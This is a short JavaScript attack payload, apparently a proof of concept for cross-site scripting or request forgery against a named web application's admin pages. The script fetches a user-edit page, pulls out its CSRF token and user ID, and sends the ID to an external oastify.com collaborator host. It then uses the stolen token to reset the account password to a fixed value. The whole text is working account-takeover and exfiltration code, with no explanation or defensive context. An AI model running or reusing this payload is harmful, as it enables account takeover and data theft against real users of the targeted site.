fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713")  
  .then(res => res.text())  
  .then(res => {  
    // Extract CSRF token  
    const tokenMatch = res.match(/__RequestVerificationToken" type="hidden" value="([^"]+)"/);  
    const token = tokenMatch ? tokenMatch[1] : "";  

    // Extract User ID  
    const userIdMatch = res.match(/<span class="blue-cursive" id='UserIDText'>(.*?)<\/span>/);  
    const userId = userIdMatch ? userIdMatch[1] : "";  

    // Send extracted User ID  
    fetch(`https://rkfe5ycsju58zwcedzbu4r647vdm1cp1.oastify.com?data=${encodeURIComponent(userId)}`);  

    // Change password using extracted token  
    fetch("https://refeng.erad.com/Home/PasswordReset", {  
      method: "POST",  
      headers: { "Content-Type": "application/x-www-form-urlencoded" },  
      body: `__RequestVerificationToken=${encodeURIComponent(token)}&NewPassword=Test@123@12&ConfirmPassword=Test@123@12&returnUrl=%2F`  
    });  
  });
